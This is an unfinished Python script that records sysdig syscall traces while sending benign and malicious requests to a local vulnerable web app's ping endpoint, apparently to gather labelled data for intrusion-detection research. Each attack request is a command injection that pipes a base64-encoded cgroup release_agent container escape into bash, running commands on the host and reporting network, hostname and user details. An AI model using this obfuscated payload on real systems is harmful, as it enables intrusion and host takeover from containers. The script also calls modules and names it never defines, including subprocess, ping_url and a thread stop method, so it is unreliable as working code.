# ####################### WIP ########################### #
import sys
import threading
from time import sleep
import requests
import random
from datetime import datetime,timezone

def getSyscallStream():
    your_command = ['docker', 'exec', 'sysdig', 'sysdig', '-p', '"%evt.time %evt.type"', 'container.name=vulnerablewebapp_ping_1']
    p = subprocess.Popen(your_command, stdout=subprocess.PIPE)
    print("---------- Starting syscall collection ----------")
    for line in iter(p.stdout.readline, b''):
        global stop
        if stop:
            print("---------- Stopping syscall collection ----------")
            break
        line = line.decode('utf-8').rstrip()[1:-1]
        t,s = line.split(' ')   
        s = s.strip()
        print(t,s,file=f)

# Starting sysdig collection
stop = False
t = threading.Thread(target=getSyscallStream)
t.start()
# Ping Workloads
ping_IP_list = ["208.67.222.222","208.67.220.220","1.1.1.1","1.0.0.1","8.8.8.8","8.8.4.4","8.1.1.0"]
ping_normal_url = "http://10.10.1.201:8081/api/ping"
ping_normal_workload1 = '{"IP":"ping -c 4'
ping_normal_workload2 =  ' "}'
ping_attack_workload = '''{"IP":"echo 'cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAicHJvZml0Ig=='|base64 -d|bash -"}'''
# SQL Workloads
# sql_url = "http://10.10.1.201:8082/api/sqlquery"
# sql_workload1 = '{"user_id":"SELECT first_name,last_name FROM users where user_id ='
# sql_workload2 = ' "}'
res = {}
for i in range(10):
    res[i]={}
    start_time = datetime.now(timezone.utc)
    if i%2==0:
        res[i]["type"]="normal"
        # Ping Code
        IP_Addr = random.choice(ping_IP_list)
        ping_normal_workload = ping_normal_workload1+IP_Addr+ping_normal_workload2
        response = requests.post(ping_url,data=ping_normal_workload)
        # SQL Code
        # sql_response = requests.post(sql_url,data=sql_workload)
    else:
        res[i]["type"]="attack"
        # Ping Code
        response = requests.post(ping_url,data=ping_attack_workload)
        # SQL Code
        # sql_response = requests.post(sql_url,data=sql_workload)
    end_time = datetime.now(timezone.utc)
    res[i]["start-time"] = start_time
    res[i]["end-time"] = end_time
    res[i]["response"] = response
    time.sleep(0.02)

# Stop the sysdig collector thread
stop = True
t.stop()
t.join()

with open("timing.txt",'w') as f:
   print(res,file=f)